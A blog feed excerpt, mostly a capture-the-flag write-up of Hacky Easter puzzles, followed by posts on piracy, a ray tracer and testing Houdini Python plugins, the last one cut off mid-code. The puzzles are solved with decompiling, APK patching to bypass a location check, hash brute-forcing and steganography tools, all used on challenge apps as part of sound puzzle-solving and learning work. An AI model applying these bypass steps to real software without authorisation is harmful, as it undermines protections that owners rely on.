&lt;div class="section" id="egg-0x0a-hidden"&gt;
&lt;h2&gt;Egg 0x0a - &lt;em&gt;hidden&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Another hidden one? I have to admit, these bugged me a lot, because you just had to
be nosey enough to find them, and they were quite tricky to find.&lt;/p&gt;
&lt;p&gt;So the first clue is that the hidden eggs might be in the files provided, outside of
challenges. Where could that be. Well let's have a look at what files they give us. A PDF Flyer.
Let's have a look there. Nothing. Just a bunch of blank eggs. But wait, what's that just poking
out between those other eggs? Hrmm. Seems to be a little bit of barcode there. I wonder if
we can extract that egg somehow. I tried &lt;a class="reference external" href="http://www.extractpdf.com/"&gt;extractpdf.com&lt;/a&gt; and sure
enough, there's the egg for you to scan.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="egg-0x0b-i-frame-you-frame"&gt;
&lt;h2&gt;Egg 0x0b - I frame, you frame&lt;/h2&gt;
&lt;p&gt;Another app based one. Fire up the challenge and you have to press a button.
You press it and it tells you that it can't be viewed in a mobile browser.&lt;/p&gt;
&lt;p&gt;So we need to figure out what URL is being accessed and enter that into a browser.
The easiest way is to connect to a proxy and look at the requests in order to determine
the URL.&lt;/p&gt;
&lt;p&gt;I used OSX and Linux to solve the challenges, and there's a nice Squid frontend for
OSX called &lt;a class="reference external" href="http://squidman.net/squidman/"&gt;Squidman&lt;/a&gt;. Start it up and then
connect to it with your device. How you do that depends on whether you have an Android or
iPhone, but I am sure you can figure it out. Once connected view the Squid logs and
press the button. You should now see the URL &lt;code&gt;GET&lt;/code&gt; request. Gran this URL and
paste it into your browser URL. Snap the pic and&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="egg-0x0c-call-me"&gt;
&lt;h2&gt;Egg 0x0c - Call Me!&lt;/h2&gt;
&lt;p&gt;Call me? What do you mean? Who are you? Where are you? will this run up a massive
phone bill?&lt;/p&gt;
&lt;p&gt;No it won't. Take a look at the image. There's a protocol specified there: &lt;em&gt;ps.hackyeaster://&lt;/em&gt;
So enter that in your mobile browser (Chrome didn't work for me, but Firefox did) followed by the number.&lt;/p&gt;
&lt;p&gt;Voila, egg 0x0C&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="egg-0x0d-hidden"&gt;
&lt;h2&gt;Egg 0x0d - &lt;em&gt;hidden&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Another hidden one.... &lt;em&gt;sigh&lt;/em&gt;, at least it's the last one.
Well ok, let's have a look at some of the other supporting files.
We've got the flyer already. Nothing else to download. Except perhaps.... Yes, the app itself.&lt;/p&gt;
&lt;p&gt;If you have an iPhone I can't tell you how to do this, but with an android you need to
grab the application APK and unzip it, search for PNG images and one of those is the egg.&lt;/p&gt;
&lt;p&gt;Phew - that's all the hidden eggs done with.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="egg-0x0e-bunny-research"&gt;
&lt;h2&gt;Egg 0x0e - Bunny Research&lt;/h2&gt;
&lt;p&gt;A PDF with some plain text and some, what appears to be, encrypted text. Well clearly the
answer is in the encrypted text. But how do we decode it? Let's just read the text around it.
Mostly just big words and hot air. Well, given the format of the encypted text it looks like a
substitution cipher of some sort. Perhaps Caesar cipher? let's Google some substituion cipher
types.... &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Substitution_cipher"&gt;Wikipedia has a page on these ciphers&lt;/a&gt;
and after reading a while we notice a word we only just saw &lt;strong&gt;Vigenère&lt;/strong&gt;. Well that is a big clue.
Let's take a look at &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher"&gt;how it works&lt;/a&gt;. So
basically we need to work out the key from the text we have. How can we possibly do that?&lt;/p&gt;
&lt;p&gt;Let's not be lazy and write or download some code that will translate between cipher text
and plain text for us. I used &lt;a class="reference external" href="http://gurno.com/adam/vigen/"&gt;this Python script&lt;/a&gt; to process the
text. So let's start analysing the text for something we might be able to identify. For me
it was the text &lt;strong&gt;XHV R* TYNEAP&lt;/strong&gt;. Given it's a computer text I bet the plain text is &lt;strong&gt;the A* search&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;In order to decipher the text and get the possible keyword we need to setup something like this:&lt;/p&gt;
&lt;pre class="code text literal-block"&gt;
-----------------------------------------------------
| T | H | E |   | A | * |   | S | E | A | R | C | H |
-----------------------------------------------------
| X | H | V |   | R | * |   | T | Y | N | E | A | P |
=====================================================
|   |   |   |   |   |   |   |   |   |   |   |   |   |
-----------------------------------------------------
&lt;/pre&gt;
&lt;p&gt;The top row is the plain text we expect, the second row is the cipher text and the bottom row
the key (or part of it). In order to get the key we reverse the lookup into the
vignere table. Look for the expected plaintext letter in the top row and go down
until you find the matching cipher letter. Then look across to find the key's letter.&lt;/p&gt;
&lt;pre class="code text literal-block"&gt;
-----------------------------------------------------
| T | H | E |   | A | * |   | S | E | A | R | C | H |
-----------------------------------------------------
| X | H | V |   | R | * |   | T | Y | N | E | A | P |
=====================================================
| E | A | R |   | R | * |   | B | U | N | N | Y | I |
-----------------------------------------------------
&lt;/pre&gt;
&lt;p&gt;We're getting something here, specifically &lt;strong&gt;BUNNYI&lt;/strong&gt;. The &lt;strong&gt;THE&lt;/strong&gt; looks like a wrong guess. Let's try
another possible 3 letter word:&lt;/p&gt;
&lt;pre class="code text literal-block"&gt;
-------------
| F | O | R |
-------------
| X | H | V |
=============
| S | T | E |
-------------
&lt;/pre&gt;
&lt;p&gt;This gives us &lt;strong&gt;EASTERBUNNY&lt;/strong&gt; - &lt;strong&gt;much&lt;/strong&gt; more likely to be correct. So let's copy out the text from the pdf
into a text file, modify the vigen script to open that instead and just enter what we have so far. One thing
you have to do is either modify the vigen script to skip non alpha chars, or remove them from the source text.&lt;/p&gt;
&lt;p&gt;Our first try outputs: &lt;em&gt;THEINVESTIGAHDALITLV....&lt;/em&gt; So we know that we were lucky that our known text is the beginning
of the cipher key. As you can see the text is clearly &lt;em&gt;the investigation...&lt;/em&gt;. Knowing this you can use the same approach
as above to solve the rest of the key. Once you've deciphered the whole text, you get the pass code. Enter it into
the page to get your key.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="egg-0x0f-paper-chase"&gt;
&lt;h2&gt;Egg 0x0f - Paper Chase&lt;/h2&gt;
&lt;p&gt;This one already provides a big hint: Google maps.&lt;/p&gt;
&lt;p&gt;So let's do a quick search to see if we can find the restaurant on line, get its address and take a look. It won't take long
to get the location of the restaurant, so open Google Earth and take a look. Lots of photos. None of them the one we want.
Clearly we can just search all the photos, but there's a smarter way. The image was taken somewhere right? So let's take
a peek at the EXIF data. There we go, location data. Enter the data into Google Earth and we go directly to a photo set.&lt;/p&gt;
&lt;p&gt;And sure enough, there's the photo we are looking for. Click, zoom, ehance, scan.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="egg-0x10-broken-egg"&gt;
&lt;h2&gt;Egg 0x10 - Broken Egg&lt;/h2&gt;
&lt;p&gt;We're given two png files. One is a partial egg, the other one doesn't even show. One thing
I tend to do is always look at the files in hex if in doubt. The first egg looks normal. Let's take a look at
the second egg. Oh, there's some familiar data there at the end. Looks like that base 64 stuff we've seen
before. Covert it and save it as a .png file. We get the right half of the egg. Weird. The partial in the second
pic is the top half.&lt;/p&gt;
&lt;p&gt;Let's take a closer look at the first egg. Notice anything? The header is corrupt. Fix the problem, save
the file, and then use your favourite image editor to combine the two halves.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="egg-0x11-number-cracker"&gt;
&lt;h2&gt;Egg 0x11 - Number Cracker&lt;/h2&gt;
&lt;p&gt;We're told what to do, so let's do that&lt;/p&gt;
&lt;pre class="code bash literal-block"&gt;
$&amp;gt; netcat hackyeaster.hacking-lab.com 1234
Enter your guess, dude:
123456789
I need &lt;span class="m"&gt;20&lt;/span&gt; digits, dude!
&lt;/pre&gt;
&lt;p&gt;Ok, so not enough digits, let's try 20&lt;/p&gt;
&lt;pre class="code bash literal-block"&gt;
$&amp;gt; netcat hackyeaster.hacking-lab.com 1234
Enter your guess, dude:
12345678901234567890
0&amp;lt;
&lt;/pre&gt;
&lt;p&gt;Hrmm. What does that mean? Let's change the command a little to make reentering
the numbers easier&lt;/p&gt;
&lt;pre class="code bash literal-block"&gt;
$&amp;gt; &lt;span class="nb"&gt;echo&lt;/span&gt; 12345678901234567890&lt;span class="p"&gt;|&lt;/span&gt; netcat hackyeaster.hacking-lab.com 1234
Enter your guess, dude:
0&amp;lt;
&lt;/pre&gt;
&lt;p&gt;Let's the edit the input from the first number.&lt;/p&gt;
&lt;pre class="code bash literal-block"&gt;
$&amp;gt; &lt;span class="nb"&gt;echo&lt;/span&gt; 22345678901234567890&lt;span class="p"&gt;|&lt;/span&gt; netcat hackyeaster.hacking-lab.com 1234
Enter your guess, dude:
1&amp;lt;
&lt;/pre&gt;
&lt;p&gt;Ahhh so it seems that the first digit tells us how many numbers are correct
from the start of the number. The &lt;em&gt;&amp;lt;&lt;/em&gt; tells us we're lower than we need to be.&lt;/p&gt;
&lt;p&gt;So you have a choice, script it, or, if you are lazy like me, go through it
manually with a binary search for each digit. It took a few minutes for me
to do it manually (if that), probably about the same time as it would have
taken to write a script to do it. Sometimes it's just easier to not try to
automate it. Once done, you'll get your egg.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="egg-0x12-lost-in-transformation"&gt;
&lt;h2&gt;Egg 0x12 - Lost in Transformation&lt;/h2&gt;
&lt;p&gt;We've got a wall of text here and our biggest clue is that the beginning of the text [100:b64]
&lt;em&gt;b64&lt;/em&gt; most likely hints at base64 encoding, so let's give it a whirl. Copy everything but the bits
in the [] and decode.&lt;/p&gt;
&lt;p&gt;Now we have &lt;code&gt;[99:inv][98:URL]&lt;/code&gt;.... oh god. It looks like... yeah, it's been encoded 100 times
with a different method each time. We will have to script this. If you fancy the exercise you can
run a loop over the text and decode it with whatever method is specified in the []. Each time you come
across a new encoding method, add it to the list.&lt;/p&gt;
&lt;p&gt;Alternatively view &lt;a class="reference external" href="https://gist.github.com/Svenito/d28572d6c9a4c1a1b603#file-egg0x0e-py"&gt;my gist&lt;/a&gt; of it here.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="egg-0x13-tap-the-xap"&gt;
&lt;h2&gt;Egg 0x13 - Tap The Xap&lt;/h2&gt;
&lt;p&gt;I hated this one. It was a pain. I thought that you had to run the xap to solve this, but I got lucky.
VERY lucky. So apparently xap files are just zip files so &lt;code&gt;unzip TapTheXap.xap&lt;/code&gt; will extract all there is
inside the app. Unfortunately no egg.png - that'd be too easy right? Where could it be? I got desperate and
ran &lt;code&gt;grep egg *&lt;/code&gt; on the files. Turns out TapTheXap.dll matches. Ok, let's see what's inside by viewing the
hexdump.&lt;/p&gt;
&lt;p&gt;Right, so in there is an egg13.png, inside, what appears to be a PKZIP. So I guess the dll contains a zip file
with the egg in it. I'll give you a quick tip: you can unzip a zip file inside a dll by just doing
&lt;code&gt;unzip TapTheXap.dll&lt;/code&gt;. I didn't know that at first, but anyway. Now it wants a password. Grrr. The password must
be in the app somewhere, so I just ran &lt;code&gt;strings TapTheXap.dll&lt;/code&gt; to see what we've got. This looks promising
&lt;em&gt;part 1: Dpbwob2HGo&lt;/em&gt;. So there must be a part 2... ah there is. But it has no password. I wish I could tell you
I had a really cunning plan and found the second part that way, but I view the file in hex again and searched for
part 2 in it. Then I scrolled looking for any interesting data. Eventually I found &lt;code&gt;tapthexap.zip&lt;/code&gt; followed by
a potential password. What else can I do but just give it a try. So add that part to the end of part1 and.... Success!!&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="egg-0x14-boolean-101"&gt;
&lt;h2&gt;Egg 0x14 - Boolean 101&lt;/h2&gt;
&lt;p&gt;Here we are given 4 files, all with binary numbers inside. The image actually gives us instructions. What we need to
do here is take the data and perform the operations on it. I used a quick Python script to parse the files, remove the white
space and perform the required operations. Once you've got that data save it to a new file and learn about
&lt;a class="reference external" href="http://netpbm.sourceforge.net/"&gt;Netbpm&lt;/a&gt;. Use this to generate the QR code.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="egg-0x15-jurrasic-hack"&gt;
&lt;h2&gt;Egg 0x15 - Jurrasic Hack&lt;/h2&gt;
&lt;p&gt;Big clue - Steganography. But which image. I figured out the image by just looking at the file sizes.
Alternatively the headers of the images (when viewed in hex) have big clue too. So I found out that the
stegasaurus was suspiciously larger than the others. That must be our candidate.&lt;/p&gt;
&lt;p&gt;I spent ages trying different steno apps on OSX and linux, but nothing. I must be wrong I thought.
So I opened it up in a hex editor to see if that will give me some answers. There was something about
&lt;em&gt;Puff&lt;/em&gt; - I did a search for it and there's a Windows steno tool call OpenPuff. I got a friend to download
and run it and sure enough, the egg's inside.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="egg-0x16-time-to-travel"&gt;
&lt;h2&gt;Egg 0x16 - Time To Travel&lt;/h2&gt;
&lt;p&gt;We need to go to where? Well relax. We don't really. Now, if you are on iPhone, I can't help
you specifically, but on Android you have to choices again. You can try a fakeGPS app to spoof
the GPS coordinates, or you can just edit the app and upload it to the device again. All you need to
do is find where the location coordinates are checked and override them. Get the egg and we're done.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="egg-0x17-egg-safe"&gt;
&lt;h2&gt;Egg 0x17 - Egg Safe&lt;/h2&gt;
&lt;p&gt;This Java application requires us to enter a number to unlock the safe. Ok, can we brute force it? Sure, but
it will take a while, so let's approach it a little more cleverly. So we can unzip a .jar file
and see what's inside. There we have an EggSafe.class - we can decompile this and take a look at what it does.
I used an online tool, but you can use whatever you wish. So we see that it's basically applying different algorithms to
each part of the number in order to compare them to known hashes. So what we need to do is &lt;em&gt;simply&lt;/em&gt; do the same, but iterate
over the numbers 0 to 9999 inclusive. Go ahead,  give it a go. If you get stuck you can view
&lt;a class="reference external" href="https://gist.github.com/Svenito/dbad0e83f0d637a5701c#file-getit-java"&gt;my solution&lt;/a&gt;. Run it and enter the numbers into the app
to decode the image. I decoded the image to disk because the supplied app wasn't showing the image on my
machine for some reason.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="egg-0x18-paper-and-pen"&gt;
&lt;h2&gt;Egg 0x18 - Paper And Pen&lt;/h2&gt;
&lt;p&gt;I loved this one after a period of frustration. I'll try to outline how I managed to decode this from that to finish.
The hint here is that it's a paper and pen cipher, so first I looked up information on those and how they
work in principle. None of the ciphers really looked anything like the one we have. I kept at it and looked at what the
ciphers do and what their output means. Some use a keyword to encode the plain text, but it'd be impossible to
decode without the keyword, and there wasn't anywhere that I could see a keyword. Others had the information
encoded inside the cipher text. So let's take a look at the text a little bit closer.&lt;/p&gt;
&lt;pre class="code text literal-block"&gt;
Dii2 Dii3 Di2 Gi1 Gi1 Aiii1 Diii2 Gi3 Aiii2 Gi2 Giii1 Dii3 Aiii3 Gii3 Di2 Diii3`
&lt;/pre&gt;
&lt;p&gt;We can see a few things here. The initial letter is either &lt;em&gt;A&lt;/em&gt;, &lt;em&gt;D&lt;/em&gt;, or &lt;em&gt;G&lt;/em&gt;, then follows one of &lt;em&gt;i&lt;/em&gt;, &lt;em&gt;ii&lt;/em&gt;, &lt;em&gt;iii&lt;/em&gt; and ends with
&lt;em&gt;1&lt;/em&gt;, &lt;em&gt;2&lt;/em&gt;, &lt;em&gt;3&lt;/em&gt;. So that's actually 3 bits of information. Which could mean we're referencing 3D coordinates. What's the deal with
A, D, and G though? Oh, look, the are all the same distance apart. So that got me thinking. &lt;em&gt;ABC&lt;/em&gt;, &lt;em&gt;DEF&lt;/em&gt;, &lt;em&gt;GHI&lt;/em&gt;.
Then I realised that those bits of information have 27 permutations, enough to chunk the alphabet into 3 groups.&lt;/p&gt;
&lt;p&gt;So that's the first group, then the next bits of the alphabet go into a second 3x3 group and finally the last letters.
Each components is an index into one part. The letters tell you the line, the &lt;em&gt;i&lt;/em&gt;'s tell you the chunk and the number the column.&lt;/p&gt;
&lt;p&gt;I ended up with this (forgive the crap ASCII table. I'll see about getting a nicer one):&lt;/p&gt;
&lt;pre class="code text literal-block"&gt;
-----------------------------------------
||    i      ||     ii    ||     iii   ||
-----------------------------------------
|| 1 | 2 | 3 || 1 | 2 | 3 || 1 | 2 | 3 ||
=========================================
|| A | B | C || J | K | L || S | T | U ||
-----------------------------------------
|| D | E | F || M | N | O || V | W | X ||
-----------------------------------------
|| G | H | I || P | Q | R || Y | Z |   ||
-----------------------------------------
&lt;/pre&gt;
&lt;p&gt;So &lt;em&gt;Dii2&lt;/em&gt; translates to &lt;code&gt;n&lt;/code&gt;. Use the table to get the full text&lt;/p&gt;
&lt;/div&gt;
</summary></entry><entry><title>Thoughts on piracy</title><link href="http://unlogic.co.uk/2014/04/12/thoughts-on-piracy/" rel="alternate"></link><updated>2014-04-12T20:00:00+01:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2014-04-12:2014/04/12/thoughts-on-piracy/</id><summary type="html">&lt;p&gt;Piracy is rampant, or so certain media and copyright trolls would lead you to believe.
I'm not sure how true this is as I have no access to figures proving it either way, and it would
require me to define at what level copying copyrighted stuff becomes &lt;em&gt;rampant&lt;/em&gt;. Besides,
this is not really what I wanted to write about. I'm more interested in airing a few
thoughts I've had about some of the things going on around piracy.&lt;/p&gt;
&lt;p&gt;Piracy, in the copyright sense, has been around for as long as can remember. Copying a
tape (a magnetic ribbon that stored data for those not as ancient as me) was not
a big issue. In fact companies manufactured tape decks with two cassette players
built in. Sometimes there was even a &amp;quot;High speed dub&amp;quot; option. Manufacturers enabled
you to copy content from one tape to another.&lt;/p&gt;
&lt;p&gt;At this point though the physical media still had to be handed from person to person,
which meant it would take some time to reach a significant number of people. The internet
however changes that, you dump a small file on a tracker site and you've made it available
to millions. So I guess that's enough reasons for all this copyright hoo-hah to increase
along side this.&lt;/p&gt;
&lt;p&gt;So in this game we have three key players:&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;The copyright owner&lt;/li&gt;
&lt;li&gt;The pirate&lt;/li&gt;
&lt;li&gt;The anti-piracy company (on behalf of he copyright owner)&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;But here's the thing I don't get: anti-piracy companies. I get what they do, but I don't
get their stance. They get paid by a copyright holder (say Warner Brothers) to track down
who is distributing their property illegally. I won't get into the whole definition of
&lt;em&gt;property&lt;/em&gt; after you make a purchase now either. So back to these anti-piracy folks.
They figure out who (or what IP) is distributing said data. They then send them some letters
asking for payment and threaten with court... you know the deal.&lt;/p&gt;
&lt;p&gt;Every so often you hear these people complain about the evil of pirates, the damaging intents
of the people who wrote things like BitTorrent etc. They wish they were never born, never
made usenet, no one should pirate blah blah.&lt;/p&gt;
&lt;p&gt;But correct me if I am wrong: these people's livelihood depends on pirates. Depends on this
technology. Especially BitTorrent which makes it so much easier to track down violators.
At least those that don't know how to protect themselves. If people stopped pirating then
these are the first people to suffer.&lt;/p&gt;
&lt;p&gt;If the people who stopped pirating also didn't buy the stuff they pirated, then the studio
wouldn't benefit either. Chances are that most of the people who pirate will buy the things
they like/want anyway and have other reasons to pirate. Those that pirate because they can't/won't
buy the products won't buy the products either way. People pirate for all manner of reasons, not
just because they refuse to pay for it. Perhaps they cannot buy it where they live, or they want
to watch a DVD they bought a while ago but have moved to a different region and no longer have the
ability to play their film. It's not always to get on over of the &lt;em&gt;big guys&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;So if piracy came to an end, what would happen? Anti-piracy companies would go away and that's
about it. Sure, there might be some small increase in takings for movies etc, but I doubt it would
be anything noticeable. You might also suggest that piracy is a free form of advertising. If
person X says that they saw an early preview of a movie and loved it, chances are that person Y
will go see it. At the very least more and more people are talking about it. Be that movies, games,
books, music, what have you, the word gets around.&lt;/p&gt;
&lt;p&gt;Perhaps I am wrong though. I am just writing down my thoughts. I don't claim to have done
extensive reasearch on this. These are just my opinions. Perhaps revenue for these
companies would increase drastically. Then again if you notice that a decent film makes a
killing at the box office, where a less that decent film flops, perhaps these big companies
should start making stuff people actually don't feel like they are wasting money if they spend
it on your product. Alternatively you could lower prices and then going to see a movie that turns
out to suck won't be such a big loss. You'd spend a few units of your currency and if you didn't like
it, then so what? Fork over 10 times that and you'll think twice before you spend it.&lt;/p&gt;
</summary></entry><entry><title>Threading Python</title><link href="http://unlogic.co.uk/2014/04/11/threading-python/" rel="alternate"></link><updated>2014-04-11T15:00:00+01:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2014-04-11:2014/04/11/threading-python/</id><summary type="html">&lt;p&gt;Having helped my colleague deal with PyQt threads, I feel that
this gif sums up threading in Python very well:&lt;/p&gt;
&lt;img alt="threads" src="https://i.imgur.com/h7mePfx.gif" /&gt;
&lt;p&gt;Happy Friday&lt;/p&gt;
</summary></entry><entry><title>Rekindling old flames</title><link href="http://unlogic.co.uk/2014/04/10/rekindling-old-flames/" rel="alternate"></link><updated>2014-04-10T21:00:00+01:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2014-04-10:2014/04/10/rekindling-old-flames/</id><summary type="html">&lt;p&gt;Some time ago, some long, long time ago, I started working on a ray tracer. Yes, you're
right, the world doesn't need another ray tracer. I wasn't writing another ray tracer though.
I was writing the ray tracer from &lt;a class="reference external" href="http://www.raytracegroundup.com/"&gt;this book&lt;/a&gt;. Well,
not line for line, but I was using it for the most part and just adjusting a few things
to my liking and style. Initially I started it because I was curious how these things
really work under the hood. The principles and concepts of a ray tracer weren't
foreign to me, but to actually implement one, component by component, that was new.
Then the project ground to a halt for what reason(s) I can't recall.&lt;/p&gt;
&lt;p&gt;So fast forward today and, feeling somewhat ashamed about it, I've decided to revive the project and
post the code on github. Right now I need to make sure the build still works and
that my system has all the dependencies, after that I'll push the code to
&lt;a class="reference external" href="https://github.com/Svenito/lemon"&gt;https://github.com/Svenito/lemon&lt;/a&gt; then I'll continue
building on the code from the book, chapter by chapter until, one day, Lemon will be complete.&lt;/p&gt;
</summary></entry><entry><title>Unit testing Houdini Python plugins with nose and coverage</title><link href="http://unlogic.co.uk/2014/03/20/unit-testing-houdini-python-plugins-with-nose-and-coverage/" rel="alternate"></link><updated>2014-03-20T12:00:00+00:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2014-03-20:2014/03/20/unit-testing-houdini-python-plugins-with-nose-and-coverage/</id><summary type="html">&lt;p&gt;We all know how important unit testing is, right? But often you wonder how can
you test a not so straight forward tool. In this case we're talking about a
Python script intended to run inside &lt;a class="reference external" href="http://sidefx.com"&gt;Houdini&lt;/a&gt;. In my specific
case the python script is launched from a script on a node when the user clicks
a button on the OTL. I want to run unit tests on this script, but the problem is
that the script parses a set of nodes and does various things according to the
types of nodes and layout of the nodes. It's clear that the HOM is required in the
unit tests. So I need to somehow run my unit tests inside houdini and have
some nodes available for my testing. Fortunately this isn't difficult to do, but
it does require a little setup and some fiddling in order to get it to work.&lt;/p&gt;
&lt;p&gt;I'll be using &lt;a class="reference external" href="https://nose.readthedocs.org"&gt;nose tests&lt;/a&gt; as my test runner and
&lt;a class="reference external" href="http://nedbatchelder.com/code/coverage/"&gt;coverage&lt;/a&gt; for coverage testing.
Because I want to make sure I test as much code as possible. I created a hip file that
contains whatever nodes and connections I need to run most of the tests and saved
this to the same directory as my test script.&lt;/p&gt;
&lt;p&gt;Before we write some code you will need to install &lt;code&gt;nose&lt;/code&gt; and &lt;code&gt;coverage&lt;/code&gt; and make
sure they work.&lt;/p&gt;
&lt;p&gt;Now that we have all our dependencies installed, we need to import all the
modules we need and set some things up.&lt;/p&gt;
&lt;pre class="code python literal-block"&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;nose&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;insert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'../path_of_module'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;
&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;environ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'NOSE_WITH_COVERAGE'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'1'&lt;/span&gt;
&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;environ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'NOSE_COVER_PACKAGE'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'module_to_test'&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;hou&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;module_to_test&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;We import the &lt;code&gt;nose&lt;/code&gt; module and then we need to tell nose to make use of the
coverage package. &lt;code&gt;os.environ['NOSE_WITH_COVERAGE'] = '1'&lt;/code&gt; does just that, and
&lt;code&gt;os.environ['NOSE_COVER_PACKAGE'] = 'module_to_test'&lt;/code&gt; restricts our test results to
the module(s) we want to test. If you want to specify multiple modules simply
separate them with commas: &lt;code&gt;os.environ['NOSE_COVER_PACKAGE'] = 'module_to_test,another_module'&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Unfortunately for this to work properly you need to patch nose's cover plugin.
There's a small bug in older versions, so depending on your distro you may need to
make the following change to &lt;code&gt;nose/plugins/cover.py&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Change these lines&lt;/p&gt;
&lt;pre class="code python literal-block"&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;pkgs&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;tolist&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;options&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cover_packages&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt;
    &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;coverPackages&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;extends&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pkgs&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;to these lines&lt;/p&gt;
&lt;pre class="code python literal-block"&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;pkgs&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;tolist&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;options&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cover_packages&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;coverPackages&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pkgs&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Otherwise the &lt;code&gt;NOSE_COVER_PACKAGE&lt;/code&gt; variable won't work properly.&lt;/p&gt;
&lt;p&gt;I also setup the &lt;code&gt;sys.path&lt;/code&gt; so that I load my local module rather
than the globally installed one. Depending on how your directories are laid out
you might not need this.&lt;/p&gt;
&lt;p&gt;After this we need to import the &lt;code&gt;hou&lt;/code&gt; module and finally the module(s) we want to test.&lt;/p&gt;
&lt;p&gt;Then we write our main function which will load our hip file and start our tests&lt;/p&gt;
&lt;pre class="code python literal-block"&gt;
&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;'__main__'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;hou&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hipFile&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;load&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'/path/to/test.hip'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

